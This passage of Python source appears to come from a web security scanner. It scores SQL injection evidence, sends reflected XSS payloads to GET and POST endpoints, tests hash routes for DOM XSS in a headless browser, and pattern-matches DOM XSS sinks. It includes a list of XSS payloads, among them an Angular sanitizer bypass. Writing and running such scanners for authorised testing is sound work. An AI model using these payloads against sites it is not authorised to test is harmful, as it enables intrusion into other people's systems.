                    delay_accuracy = 1.0 - abs(actual_delay - expected_delay) / expected_delay
                    timing_confidence = max(0.65, min(0.90, 0.75 + delay_accuracy * 0.15))
                    evidence.append(
                        f"Time-based delay: {actual_delay:.2f}s (baseline {baseline_elapsed:.2f}s, "
                        f"expected ~{expected_delay}s, timing_confidence={timing_confidence:.2f})"
                    )
                    # Note: For higher confidence, use statistical_timing_test() with multiple samples

    # 3. JSON structure comparison for blind SQLi
    if baseline_body and not strong_signal:
        baseline_json = _try_parse_json(baseline_body)
        response_json = _try_parse_json(out)

        if baseline_json is not None and response_json is not None:
            # Compare JSON key sets
            baseline_keys = _extract_json_keys(baseline_json)
            response_keys = _extract_json_keys(response_json)
            key_diff = baseline_keys.symmetric_difference(response_keys)
            if key_diff:
                evidence.append(f"JSON structure changed: {len(key_diff)} key(s) differ")

            # Compare array lengths
            baseline_arrays = _get_array_lengths(baseline_json)
            response_arrays = _get_array_lengths(response_json)
            for key in baseline_arrays:
                if key in response_arrays:
                    bl = baseline_arrays[key]
                    rl = response_arrays[key]
                    if bl != rl:
                        evidence.append(f"Array '{key}' length: {bl} -> {rl}")

    # 3b. Authentication-bypass proof for login endpoints. A failed-login
    # baseline becoming an authenticated JSON session is strong evidence for
    # SQLi even when the app does not expose DB errors or timing signals.
    if not strong_signal and _looks_like_auth_failure_response(baseline_status, baseline_body):
        success_signals = _auth_success_signals_from_body(out)
        if status_code is not None and 200 <= status_code < 300 and {
            "auth_token_or_session",
            "user_identity_data",
        }.issubset(set(success_signals)):
            strong_signal = True
            evidence.append(
                "Authentication bypass via SQLi: invalid-login baseline returned an authenticated session "
                f"({', '.join(success_signals)})"
            )

    # 4. Boolean-based detection (true/false condition comparison)
    if "boolean" in technique and true_condition_len is not None:
        false_len = response_len  # Current response is "false" condition
        if true_condition_len > 0:
            diff_ratio = abs(true_condition_len - false_len) / max(true_condition_len, false_len)
            if diff_ratio > 0.3:  # 30% difference between true/false
                strong_signal = True
                evidence.append(f"Boolean difference: true={true_condition_len}, false={false_len}")

    # 5. Response size change (lowered threshold for evidence)
    if baseline_len > 0:
        size_diff = abs(response_len - baseline_len) / baseline_len
        if size_diff > 0.3:  # 30% change = evidence
            evidence.append(f"Response size changed: {baseline_len} -> {response_len} ({size_diff*100:.1f}%)")

    # 6. Server crash indicators (200 -> 500/502/503)
    if status_code is not None and baseline_status is not None:
        if baseline_status == 200 and status_code in (500, 502, 503):
            evidence.append(f"Server crash indicator: {baseline_status} -> {status_code}")
            if size_diff is not None and size_diff > 0.5:
                strong_signal = True
        elif baseline_status < 400 and status_code >= 500:
            if size_diff is not None and size_diff > 0.3:
                evidence.append(f"Status code changed: {baseline_status} -> {status_code}")
            if size_diff is not None and size_diff > 0.5:
                strong_signal = True

    # 7. Data extraction indicators. Reflected payload tokens like @@version
    # are not proof; only DB/banner/schema output counts here.
    # If the parameter is confirmed to reflect input, this heuristic is wholly
    # unreliable (the token may just be the echoed payload) — skip it.
    if not reflected and ("schema" in technique or "version" in technique or "user" in technique or "database" in technique):
        extraction_patterns: list[str] = []
        if "version" in technique:
            extraction_patterns.extend([
                r"\b(?:MySQL|MariaDB)\s+\d+(?:\.\d+)+",
                r"\bPostgreSQL\s+\d+(?:\.\d+)+",
                r"\bMicrosoft SQL Server\b[^\n]{0,80}\d{4}",
                r"\bSQLite\s+\d+(?:\.\d+)+",
                r"\bOracle Database\b[^\n]{0,80}\d+(?:c|g)?\b",
            ])
        if "schema" in technique:
            extraction_patterns.extend([
                r"\bCREATE\s+TABLE\b",
                r"\binformation_schema\b",
                r"\bsqlite_master\b",
                r"\bpg_catalog\b",
                r"\bsys\.tables\b",
            ])
        for pattern in extraction_patterns:
            if re.search(pattern, out or "", re.I) and not re.search(pattern, baseline_body or "", re.I):
                # Reflected-payload guard: if our injected payload itself contains
                # this token, a match in the response is just the echo of our
                # payload (e.g. an error page printing the query), not data the
                # database returned. Skip it.
                if payload and re.search(pattern, payload, re.I):
                    continue
                strong_signal = True
                evidence.append(f"Data extraction indicator: {pattern}")
                break

    return strong_signal, evidence


def _select_xss_payloads(context: str) -> list[tuple[str, str, str]]:
    """Context payloads plus any user-supplied XSS payloads (additive)."""
    payloads = list(CONTEXT_XSS_PAYLOADS.get(context, CONTEXT_XSS_PAYLOADS["in_html"]))
    seen = {(p, t) for p, t, _ in payloads}
    for custom in _load_custom_payloads("xss", include_packs=True):
        if (custom, "custom") not in seen:
            payloads.append((custom, "custom", "User-supplied XSS payload"))
            seen.add((custom, "custom"))
    return payloads


async def smart_xss_test(
    url: str,
    endpoints: list[dict],
    auth_session: Any | None = None,
    max_endpoints: int = 50,
    max_params_per_endpoint: int = 5,
    max_seconds: float | None = None,
    max_findings: int | None = None,
) -> dict:
    """
    Context-aware XSS testing.

    Args:
        url: Base URL
        endpoints: List of endpoints with params to test
        auth_session: AuthSession for authenticated requests (optional)
        max_endpoints: Max endpoints to test (default 50, thorough: 100)
        max_params_per_endpoint: Max params to test per endpoint (default 5, thorough: 10)

    Returns:
        Dict with XSS findings
    """
    import random
    import copy

    results = {
        "findings": [],
        "endpoints_tested": 0,
        "params_tested": 0,
        "reflections_found": 0,
        "vulnerabilities_found": 0,
        "get_endpoints_tested": 0,
        "post_endpoints_tested": 0,
        "budget_exhausted": False,
        "budget_exhausted_reason": None,
        "endpoint_attempts": [],
    }
    deadline = time.monotonic() + max_seconds if max_seconds and max_seconds > 0 else None
    budget_logged = False
    progress_started = time.monotonic()
    last_progress_emit = 0.0

    def _emit_xss_progress(message: str, force: bool = False) -> None:
        nonlocal last_progress_emit
        now = time.monotonic()
        if not force and now - last_progress_emit < 30.0:
            return
        elapsed = now - progress_started
        if max_seconds and max_seconds > 0:
            pct = 92 + int(1 * min(1.0, elapsed / max_seconds))
        else:
            pct = min(93, 92 + int(elapsed // 300))
        _emit_scan_progress(
            "active_xss",
            pct,
            (
                f"{message}; endpoints={results['endpoints_tested']} "
                f"params={results['params_tested']} findings={results['vulnerabilities_found']}"
            ),
        )
        last_progress_emit = now

    def _budget_exhausted() -> bool:
        nonlocal budget_logged
        if _scanner_cancel_requested():
            results["budget_exhausted"] = True
            results["budget_exhausted_reason"] = "cancelled"
            if not budget_logged:
                print("[xss] Cancellation requested; stopping XSS probes", file=sys.stderr)
                _emit_xss_progress("cancel requested", force=True)
                budget_logged = True
            return True
        if max_findings is not None and results["vulnerabilities_found"] >= max_findings:
            results["budget_exhausted"] = True
            results["budget_exhausted_reason"] = "finding_cap"
            if not budget_logged:
                print(f"[xss] Finding budget reached ({max_findings}); stopping XSS probes", file=sys.stderr)
                _emit_xss_progress("finding budget reached", force=True)
                budget_logged = True
            return True
        if deadline is not None and time.monotonic() >= deadline:
            results["budget_exhausted"] = True
            results["budget_exhausted_reason"] = "time_budget"
            if not budget_logged:
                print("[xss] Time budget exhausted; stopping XSS probes", file=sys.stderr)
                _emit_xss_progress("time budget exhausted", force=True)
                budget_logged = True
            return True
        return False

    auth_args = get_auth_curl_args(auth_session)
    _emit_xss_progress("starting XSS probes", force=True)

    def _coerce_param_list(raw: Any) -> list[str]:
        if isinstance(raw, dict):
            return [str(k) for k in raw.keys() if k]
        if isinstance(raw, (list, tuple, set)):
            return [str(v) for v in raw if v]
        if isinstance(raw, str):
            return [raw] if raw else []
        return []

    def _method_allowed(endpoint: dict[str, Any], method: str) -> bool:
        allowed = endpoint.get("allowed_methods")
        if allowed:
            return method in [m.upper() for m in allowed]
        return True

    def _is_file_param(name: str) -> bool:
        name_l = name.lower()
        return any(tok in name_l for tok in ("file", "upload", "attachment", "image", "avatar", "photo"))

    # Separate GET and POST endpoints to ensure both get tested
    get_endpoints = [
        e for e in endpoints
        if e.get("method", "GET").upper() == "GET"
        and _method_allowed(e, "GET")
        and not _is_hash_route(e.get("url", ""))
    ]
    post_endpoints = [
        e for e in endpoints
        if e.get("method", "GET").upper() in ("POST", "PUT", "PATCH")
        and _method_allowed(e, e.get("method", "GET").upper())
    ]

    # Value-sort so real, high-value endpoints lead instead of synthetic permutations.
    get_endpoints = _prioritize_active_endpoints(get_endpoints)
    post_endpoints = _prioritize_active_endpoints(post_endpoints)

    # Test GET endpoints
    for endpoint in get_endpoints[:max_endpoints]:
        if _budget_exhausted():
            break
        endpoint_url = endpoint.get("url", "")
        # Resolve path parameters like {id} or :id
        if "{" in endpoint_url or re.search(r"/:[^/?#]+", endpoint_url):
            endpoint_url = _resolve_path_params(endpoint_url)
            if "{" in endpoint_url:
                continue
        params = _coerce_param_list(endpoint.get("params") or endpoint.get("query_params"))
        param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}

        if not params:
            continue

        attempt = _new_endpoint_attempt(
            endpoint,
            "xss",
            url_override=endpoint_url,
            method_override="GET",
            params=list(params),
        )
        results["endpoints_tested"] += 1
        results["get_endpoints_tested"] += 1
        _emit_xss_progress(f"testing GET endpoint {endpoint_url}")

        for param in params[:max_params_per_endpoint]:
            if _budget_exhausted():
                break
            results["params_tested"] += 1
            if attempt is not None:
                attempt["attempted_params_count"] += 1
            _emit_xss_progress(f"testing GET param {param}")
            # Send canary to detect reflection
            canary = f"xss{random.randint(10000, 99999)}test"

            parsed = urllib.parse.urlparse(endpoint_url)
            test_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            for name, value in param_defaults.items():
                if name not in test_params:
                    test_params[name] = _stringify_body_value(value)
            test_params[param] = canary
            test_query = urllib.parse.urlencode(test_params)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

            out, err, rc = await run([
                "curl", "-sS", "-L", "-k", "--max-time", "10",
                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            ] + auth_args + [test_url], timeout=12)
            if attempt is not None:
                attempt["completed_params_count"] += 1

            if rc != 0 or not out:
                continue

            # Check if canary is reflected
            if canary not in out:
                continue

            results["reflections_found"] += 1

            # Detect context
            context = detect_reflection_context(out, canary)
            if context == "not_reflected":
                continue

            # Get context-specific payloads
            payloads = _select_xss_payloads(context)

            for payload, technique, description in payloads:
                if _budget_exhausted():
                    break
                test_params[param] = payload
                test_query = urllib.parse.urlencode(test_params)
                payload_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

                payload_out, _, payload_rc = await run([
                    "curl", "-sS", "-L", "-k", "--max-time", "10",
                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                ] + auth_args + [payload_url], timeout=12)

                if payload_rc != 0 or not payload_out:
                    continue

                # Check if payload is reflected unescaped
                is_vulnerable = False
                evidence = []

                # Check for unescaped reflection
                if payload in payload_out:
                    # Make sure it's not escaped
                    escaped_variants = [
                        payload.replace("<", "&lt;"),
                        payload.replace(">", "&gt;"),
                        payload.replace("'", "&#39;"),
                        payload.replace('"', "&quot;"),
                        urllib.parse.quote(payload),
                    ]
                    if not any(ev in payload_out for ev in escaped_variants):
                        is_vulnerable = True
                        evidence.append(f"Payload reflected unescaped in {context}")

                # Check for Angular expression evaluation
                if context == "in_angular" and "{{7*7}}" in payload:
                    if "49" in payload_out:
                        is_vulnerable = True
                        evidence.append("Angular expression evaluated: {{7*7}} = 49")

                if is_vulnerable:
                    # Determine initial severity
                    severity = "high" if context in ["in_script", "in_angular"] else "medium"
                    confidence = 0.85
                    verified = False
                    proof_data = None

                    # A browser proof of execution is the real arbiter of XSS
                    # severity, regardless of WHERE the payload reflected. Attempt
                    # proof for EVERY reflected context (HTML/JSON/attribute/script),
                    # not just in_script/in_angular — reflected payloads that execute
                    # in a real browser are High wherever they landed. Proven ->
                    # High; an unproven reflection that context-guessed High -> medium.
                    if HAS_XSS_PROOF and prove_xss_headless:
                        try:
                            proof = await prove_xss_headless(
                                url=endpoint_url,
                                param=param,
                                payload=payload,
                                screenshot_dir=None  # Could add /tmp/xss_proofs if needed
                            )
                            if proof and proof.proven:
                                verified = True
                                severity = "high"
                                confidence = proof.confidence  # 0.99 dialog / 0.90 console / 0.85 DOM
                                evidence.append(f"Browser proof: {proof.technique}")
                                if proof.extracted_data:
                                    evidence.append(f"Proof data: {proof.extracted_data}")
                                proof_data = proof.to_dict()
                            elif severity == "high":
                                # context guessed high but no execution confirmed
                                severity = "medium"
                                confidence = 0.65
                                evidence.append("Browser verification attempted but no execution confirmed")
                        except Exception as e:
                            # Don't fail the scan if browser proof fails
                            evidence.append(f"Browser verification skipped: {e}")

                    finding = {
                        "type": "XSS",
                        "subtype": context,
                        "url": endpoint_url,
                        "method": "GET",
                        "param": param,
                        "payload": payload,
                        "technique": technique,
                        "description": description,
                        "evidence": evidence,
                        "confidence": confidence,
                        "severity": severity,
                        "verified": verified,
                    }
                    if verified:
                        # Browser-proven execution: pass an explicit High CVSS so the
                        # generic 6.1 reflected-XSS base score can't cap it to medium.
                        finding["cvss_score"] = 7.4
                    if proof_data:
                        finding["browser_proof"] = proof_data
                    request_headers = _headers_from_curl_args(auth_args)
                    if request_headers:
                        finding["request_headers"] = request_headers

                    results["findings"].append(finding)
                    results["vulnerabilities_found"] += 1
                    break  # One confirmed XSS per param is enough

        finished = _finish_endpoint_attempt(
            attempt,
            budget_exhausted=bool(results.get("budget_exhausted")),
            budget_exhausted_reason=results.get("budget_exhausted_reason"),
        )
        if finished:
            results["endpoint_attempts"].append(finished)

    # Test POST/PUT/PATCH endpoints with body params
    for endpoint in post_endpoints[:max_endpoints]:
        if _budget_exhausted():
            break
        endpoint_url = endpoint.get("url", "")
        # Resolve path parameters like {id} or :id
        if "{" in endpoint_url or re.search(r"/:[^/?#]+", endpoint_url):
            endpoint_url = _resolve_path_params(endpoint_url)
            if "{" in endpoint_url:
                continue

        method = endpoint.get("method", "POST").upper()
        body_params = _coerce_param_list(endpoint.get("body_params") or endpoint.get("params"))
        content_type = endpoint.get("content_type") or "application/json"

        if not body_params:
            continue

        attempt = _new_endpoint_attempt(
            endpoint,
            "xss",
            url_override=endpoint_url,
            method_override=method,
            body_params=list(body_params),
        )
        results["endpoints_tested"] += 1
        results["post_endpoints_tested"] += 1
        _emit_xss_progress(f"testing {method} endpoint {endpoint_url}")

        base_body = _build_body_template(endpoint)
        is_array_body = isinstance(base_body, list)
        if is_array_body and "json" not in content_type.lower():
            finished = _finish_endpoint_attempt(attempt, skipped_reason="unsupported_array_body_content_type")
            if finished:
                results["endpoint_attempts"].append(finished)
            continue

        auth_post_args = _filter_curl_headers(auth_args, {"content-type"})

        for param in body_params[:max_params_per_endpoint]:
            if _budget_exhausted():
                break
            if "multipart/form-data" in content_type.lower() and _is_file_param(param):
                continue
            results["params_tested"] += 1
            if attempt is not None:
                attempt["attempted_params_count"] += 1
            _emit_xss_progress(f"testing {method} param {param}")

            canary = f"xss{random.randint(10000, 99999)}test"
            test_body = _apply_body_param(base_body, param, canary)
            body_args, header_args = _build_curl_body_args(test_body, content_type)

            out, err, rc = await run([
                "curl", "-sS", "-L", "-k", "--max-time", "10",
                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                "-X", method,
            ] + auth_post_args + header_args + body_args + [endpoint_url], timeout=12)
            if attempt is not None:
                attempt["completed_params_count"] += 1

            if rc != 0 or not out:
                continue

            if canary not in out:
                continue

            results["reflections_found"] += 1

            context = detect_reflection_context(out, canary)
            if context == "not_reflected":
                continue

            payloads = _select_xss_payloads(context)

            for payload, technique, description in payloads:
                if _budget_exhausted():
                    break
                payload_body = _apply_body_param(base_body, param, payload)
                payload_args, payload_headers = _build_curl_body_args(payload_body, content_type)

                payload_out, _, payload_rc = await run([
                    "curl", "-sS", "-L", "-k", "--max-time", "10",
                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                    "-X", method,
                ] + auth_post_args + payload_headers + payload_args + [endpoint_url], timeout=12)

                if payload_rc != 0 or not payload_out:
                    continue

                is_vulnerable = False
                evidence = []

                if payload in payload_out:
                    escaped_variants = [
                        payload.replace("<", "&lt;"),
                        payload.replace(">", "&gt;"),
                        payload.replace("'", "&#39;"),
                        payload.replace('"', "&quot;"),
                        urllib.parse.quote(payload),
                    ]
                    if not any(ev in payload_out for ev in escaped_variants):
                        is_vulnerable = True
                        evidence.append(f"Payload reflected unescaped in {context}")

                if context == "in_angular" and "{{7*7}}" in payload:
                    if "49" in payload_out:
                        is_vulnerable = True
                        evidence.append("Angular expression evaluated: {{7*7}} = 49")

                if is_vulnerable:
                    severity = "high" if context in ["in_script", "in_angular"] else "medium"
                    confidence = 0.85
                    verified = False

                    finding = {
                        "type": "XSS",
                        "subtype": context,
                        "url": endpoint_url,
                        "method": method,
                        "param": param,
                        "payload": payload,
                        "technique": technique,
                        "description": description,
                        "evidence": evidence,
                        "confidence": confidence,
                        "severity": severity,
                        "verified": verified,
                        "content_type": content_type,
                        "body": payload_body,
                    }
                    request_headers = _headers_from_curl_args(auth_post_args + payload_headers)
                    if request_headers:
                        finding["request_headers"] = request_headers

                    results["findings"].append(finding)
                    results["vulnerabilities_found"] += 1
                    break  # One confirmed XSS per param is enough

        finished = _finish_endpoint_attempt(
            attempt,
            budget_exhausted=bool(results.get("budget_exhausted")),
            budget_exhausted_reason=results.get("budget_exhausted_reason"),
        )
        if finished:
            results["endpoint_attempts"].append(finished)

    # Note: Hash route DOM XSS is tested separately via hash_route_dom_xss_test()
    # which is called unconditionally in smart scans (not gated by run_xss flag)

    _emit_xss_progress("XSS probes complete", force=True)
    return results


async def hash_route_dom_xss_test(
    endpoints: list[dict],
    max_endpoints: int = 50,
    max_params_per_endpoint: int = 5,
) -> dict:
    """
    Test hash route endpoints for DOM XSS vulnerabilities.

    This test always runs in smart scans regardless of --xss flag because:
    1. DOM XSS in hash routes is a distinct vulnerability class
    2. Static DOM XSS analysis may miss dynamic exploitation
    3. SPAs commonly use hash routes for navigation

    Requires Playwright for browser-based verification.

    Args:
        endpoints: List of endpoints with params to test
        max_endpoints: Max hash route endpoints to test
        max_params_per_endpoint: Max params to test per endpoint

    Returns:
        Dict with DOM XSS findings for hash routes
    """
    results = {
        "findings": [],
        "endpoints_tested": 0,
        "params_tested": 0,
        "vulnerabilities_found": 0,
        "endpoint_attempts": [],
    }

    # Filter to hash route endpoints only
    hash_route_endpoints = [
        e for e in endpoints
        if _is_hash_route(e.get("url", ""))
    ]

    if not hash_route_endpoints:
        return results

    if not HAS_XSS_PROOF:
        print(f"[dom-xss] Skipping {len(hash_route_endpoints)} hash route endpoints: Playwright not available", file=sys.stderr)
        results["skipped"] = True
        results["reason"] = "playwright_not_available"
        return results

    print(f"[dom-xss] Testing {min(len(hash_route_endpoints), max_endpoints)} hash route endpoints for DOM XSS", file=sys.stderr)

    # DOM XSS payloads for fragment injection.
    # The iframe javascript:/srcdoc vectors are listed FIRST because they are the
    # ones that survive Angular's built-in sanitizer (which strips img/svg event
    # handlers): this is exactly OWASP Juice Shop's headline DOM XSS via
    # #/search?q=<iframe src="javascript:alert(`xss`)">. Without these the only
    # list that actually runs in a smart scan missed Juice Shop entirely.
    DOM_XSS_PAYLOADS = [
        ("<iframe src=\"javascript:alert(1)\">", "iframe_js_uri", "Iframe javascript: URI (Angular sanitizer bypass)"),
        ("<iframe srcdoc=\"<script>alert(1)</script>\">", "iframe_srcdoc", "Iframe srcdoc script execution"),
        ("<img src=x onerror=alert(1)>", "img_onerror", "Image onerror event"),
        ("<svg onload=alert(1)>", "svg_onload", "SVG onload event"),
        ("'-alert(1)-'", "js_expression", "JavaScript expression injection"),
        ("\"><img src=x onerror=alert(1)>", "attr_break_img", "Attribute breakout to image"),
    ]

    def _coerce_param_list(raw: Any) -> list[str]:
        if isinstance(raw, dict):
            return [str(k) for k in raw.keys() if k]
        if isinstance(raw, (list, tuple, set)):
            return [str(v) for v in raw if v]
        if isinstance(raw, str):
            return [raw] if raw else []
        return []

    for endpoint in hash_route_endpoints[:max_endpoints]:
        endpoint_url = endpoint.get("url", "")
        base_url, frag_path, frag_params = _parse_fragment_params(endpoint_url)

        # Get params from endpoint definition or fragment
        params = _coerce_param_list(endpoint.get("params") or endpoint.get("query_params"))
        if not params and frag_params:
            params = list(frag_params.keys())

        if not params:
            continue

        # §4 DOM-sink prioritization: when the per-endpoint param budget caps how
        # many params we test, test the ones that most commonly flow into dangerous
        # DOM sinks first (search/query/redirect/url/hash/...), plus any params the
        # endpoint's JS analysis flagged as sink sources. Generic, app-agnostic.
        sink_params = {str(s).lower() for s in (endpoint.get("dom_sink_params") or [])}
        def _dom_sink_rank(p: str) -> int:
            pl = str(p).lower()
            if pl in sink_params:
                return 0
            if any(k in pl for k in (
                "search", "query", "q", "redirect", "return", "url", "uri", "next",
                "hash", "fragment", "html", "content", "msg", "message", "text",
                "name", "title", "lang", "page", "view", "ref", "callback")):
                return 1
            return 2
        params = sorted(params, key=_dom_sink_rank)

        attempt = _new_endpoint_attempt(
            endpoint,
            "dom_xss",
            url_override=endpoint_url,
            method_override="GET",
            params=list(params),
        )
        results["endpoints_tested"] += 1

        for param in params[:max_params_per_endpoint]:
            results["params_tested"] += 1
            if attempt is not None:
                attempt["attempted_params_count"] += 1

            for payload, technique, description in DOM_XSS_PAYLOADS:
                # Build test URL with payload in fragment parameter
                test_frag_params = dict(frag_params) if frag_params else {}
                test_frag_params[param] = [payload]
                test_url = _build_fragment_url(base_url, frag_path, test_frag_params)

                # Must use browser-based verification for DOM XSS
                try:
                    proof = await prove_xss_headless(
                        url=base_url,
                        param=param,
                        payload=payload,
                        screenshot_dir=None,
                        fragment_path=frag_path,
                        fragment_params=test_frag_params,
                    )
                    if proof and proof.proven:
                        # A fired dialog / console execution (confidence >= 0.9) is
                        # confirmed script execution -> High. Pass an explicit High CVSS
                        # so the generic XSS base score (6.1) can't cap it to medium.
                        executed = proof.confidence >= 0.9
                        severity = "high" if executed else "medium"
                        finding = {
                            "type": "XSS",
                            "subtype": "dom_xss_hash_route",
                            "url": test_url,
                            "method": "GET",
                            "param": param,
                            "payload": payload,
                            "technique": technique,
                            "description": description,
                            "evidence": [
                                f"Browser proof: {proof.technique}",
                                f"Confidence: {proof.confidence}",
                                "payload executed in headless browser (dialog fired)" if executed
                                else "payload landed in executable DOM context",
                            ],
                            "confidence": proof.confidence,
                            "severity": severity,
                            "cvss_score": 7.4 if executed else 6.1,
                            "verified": executed,
                        }
                        if hasattr(proof, "to_dict"):
                            finding["browser_proof"] = proof.to_dict()
                        results["findings"].append(finding)
                        results["vulnerabilities_found"] += 1
                        break  # Found vulnerability for this param
                except Exception:
                    # Browser proof failed, continue with other payloads
                    pass
            if attempt is not None:
                attempt["completed_params_count"] += 1

        finished = _finish_endpoint_attempt(attempt)
        if finished:
            results["endpoint_attempts"].append(finished)

    return results


# DOM XSS sources and sinks for detection
DOM_XSS_SOURCES = [
    # URL-based sources
    r"document\.URL",
    r"document\.documentURI",
    r"document\.baseURI",
    r"location\.href",
    r"location\.search",
    r"location\.hash",
    r"location\.pathname",
    r"window\.name",
    r"document\.referrer",
    r"document\.cookie",
    # Storage sources
    r"localStorage\.getItem",
    r"sessionStorage\.getItem",
    r"localStorage\[",
    r"sessionStorage\[",
    # Message sources
    r"postMessage",
    r"\.data",  # from message events
    # Other sources
    r"history\.pushState",
    r"history\.replaceState",
]

DOM_XSS_SINKS = [
    # Direct execution sinks (Critical)
    (r"eval\s*\(", "critical", "eval"),
    (r"Function\s*\(", "critical", "Function constructor"),
    (r"setTimeout\s*\([^,]*,", "critical", "setTimeout with string"),
    (r"setInterval\s*\([^,]*,", "critical", "setInterval with string"),
    (r"new\s+Function\s*\(", "critical", "new Function"),
    # HTML sinks (High)
    (r"\.innerHTML\s*=", "high", "innerHTML assignment"),
    (r"\.outerHTML\s*=", "high", "outerHTML assignment"),
    (r"document\.write\s*\(", "high", "document.write"),
    (r"document\.writeln\s*\(", "high", "document.writeln"),
    (r"\.insertAdjacentHTML\s*\(", "high", "insertAdjacentHTML"),
    # jQuery sinks (High)
    (r"\$\s*\([^)]*\)\.html\s*\(", "high", "jQuery html()"),
    (r"\$\s*\([^)]*\)\.append\s*\(", "high", "jQuery append()"),
    (r"\$\s*\([^)]*\)\.prepend\s*\(", "high", "jQuery prepend()"),
    (r"\$\s*\([^)]*\)\.after\s*\(", "high", "jQuery after()"),
    (r"\$\s*\([^)]*\)\.before\s*\(", "high", "jQuery before()"),
    (r"\$\s*\([^)]*\)\.replaceWith\s*\(", "high", "jQuery replaceWith()"),
    (r"jQuery\s*\([^)]*\)\.html\s*\(", "high", "jQuery html()"),
    # URL sinks (Medium-High)
    (r"location\s*=", "high", "location assignment"),
    (r"location\.href\s*=", "high", "location.href assignment"),
    (r"location\.replace\s*\(", "high", "location.replace"),
    (r"location\.assign\s*\(", "high", "location.assign"),
    (r"window\.open\s*\(", "medium", "window.open"),
    # Attribute sinks (Medium)
    (r"\.setAttribute\s*\(['\"]on", "high", "setAttribute event handler"),
    (r"\.setAttribute\s*\(['\"]href", "medium", "setAttribute href"),
    (r"\.setAttribute\s*\(['\"]src", "medium", "setAttribute src"),
    (r"\.src\s*=", "medium", "src assignment"),
    (r"\.href\s*=", "medium", "href assignment"),
    # Script injection (Critical)
    (r"\.script\.src\s*=", "critical", "script.src assignment"),
    (r"createElement\s*\(['\"]script", "high", "createElement script"),
    # React dangerouslySetInnerHTML (High)
    (r"dangerouslySetInnerHTML", "high", "React dangerouslySetInnerHTML"),
    # Angular bypassSecurityTrust (High)
    (r"bypassSecurityTrust", "high", "Angular security bypass"),
    # Vue v-html
    (r"v-html\s*=", "high", "Vue v-html directive"),
]


async def dom_xss_analysis(
    url: str,
    js_urls: list[str] | None = None,
    auth_session: Any | None = None,
    max_files: int = 20
) -> dict:
    """
    Analyze JavaScript files for DOM-based XSS vulnerabilities.

    This function performs static analysis of JavaScript code to identify
    potential DOM XSS vulnerabilities by looking for dangerous source-to-sink
    data flows.

    Args:
        url: Base URL to analyze
        js_urls: Optional list of specific JS URLs to analyze
        auth_session: AuthSession for authenticated requests
        max_files: Maximum number of JS files to analyze

    Returns:
        Dict with findings and analysis stats
    """
    results = {
        "findings": [],
        "files_analyzed": 0,
        "sinks_found": 0,
        "sources_found": 0,
        "potential_vulns": 0,
    }

    auth_args = get_auth_curl_args(auth_session)

    # If no specific JS URLs provided, try to discover them from the page
    if not js_urls:
        # Fetch the main page and extract JS URLs
        cmd = [
            "curl", "-sS", "-L", "-k", "--max-time", "15",
            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        ] + auth_args + [url]

        out, _, rc = await run(cmd, timeout=20)
        if rc != 0 or not out:
            return results

        # Extract JavaScript URLs from the page
        js_urls = []
        # Script src patterns
        src_pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
        for match in re.finditer(src_pattern, out, re.I):
            src = match.group(1)
            if not src.startswith("data:"):
                # Resolve relative URLs
                if src.startswith("//"):
                    src = "https:" + src
                elif src.startswith("/"):
                    parsed = urllib.parse.urlparse(url)
                    src = f"{parsed.scheme}://{parsed.netloc}{src}"
                elif not src.startswith("http"):
                    parsed = urllib.parse.urlparse(url)
                    base_path = "/".join(parsed.path.split("/")[:-1])
                    src = f"{parsed.scheme}://{parsed.netloc}{base_path}/{src}"
                js_urls.append(src)

        # Also look for inline scripts
        inline_pattern = r'<script[^>]*>([\s\S]*?)</script>'
        inline_scripts = re.findall(inline_pattern, out, re.I)

        # Analyze inline scripts
        for i, script_content in enumerate(inline_scripts[:10]):  # Limit inline scripts
            if len(script_content.strip()) > 50:  # Skip empty/tiny scripts
                findings = _analyze_js_content(script_content, f"{url}#inline-{i}")
                results["findings"].extend(findings)
                if findings:
                    results["files_analyzed"] += 1

    # Analyze external JS files
    for js_url in js_urls[:max_files]:
        cmd = [
            "curl", "-sS", "-L", "-k", "--max-time", "10",
            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        ] + auth_args + [js_url]

        out, _, rc = await run(cmd, timeout=15)
        if rc != 0 or not out:
            continue

        # Skip minified files that are too large (likely libraries)
        if len(out) > 500000 and ".min." in js_url:
            print(f"[dom-xss] Skipping large minified file: {js_url}", file=sys.stderr)
            continue

        findings = _analyze_js_content(out, js_url)
        results["findings"].extend(findings)
        results["files_analyzed"] += 1

    # Deduplicate findings
    seen = set()
    unique_findings = []
    for f in results["findings"]:
        key = (f["sink_type"], f["file"], f.get("line", 0))
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    results["findings"] = unique_findings
    results["potential_vulns"] = len(unique_findings)

    # Count sinks and sources
    results["sinks_found"] = sum(1 for f in results["findings"] if "sink" in f.get("type", "").lower())
    results["sources_found"] = sum(1 for f in results["findings"] if f.get("source_nearby", False))

    return results


def _analyze_js_content(js_content: str, source_url: str) -> list[dict]:
    """
    Analyze JavaScript content for DOM XSS patterns.

    Returns list of potential vulnerability findings.
    """
    # Skip known library/framework files to reduce false positives
    library_patterns = [
        "vendor.", "vendor-", "vendors.",
        "angular.", "angular-", "angular/",
        "react.", "react-", "react/",
        "vue.", "vue-", "vue/",
        "jquery.", "jquery-",
        "lodash.", "moment.", "rxjs.",
        "zone.", "polyfill",
        "runtime.", "webpack",
        "node_modules/", ".min.js",
        "chunk.", "chunks/",
    ]
    vendor_patterns = [
        "clerk.",
        "stripe.com",
        "googletagmanager.com",
        "google-analytics.com",
        "cdn.jsdelivr.net",
        "cdnjs.cloudflare.com",
        "unpkg.com",
    ]
    url_lower = source_url.lower()
    if any(pattern in url_lower for pattern in library_patterns + vendor_patterns):
        return []  # Skip library files

    findings = []

    # Split into lines for line number tracking
    lines = js_content.split("\n")

    for line_num, line in enumerate(lines, 1):
        # Check for sinks
        for sink_pattern, severity, sink_name in DOM_XSS_SINKS:
            if re.search(sink_pattern, line, re.I):
                # Check if any source is nearby (within 5 lines)
                context_start = max(0, line_num - 6)
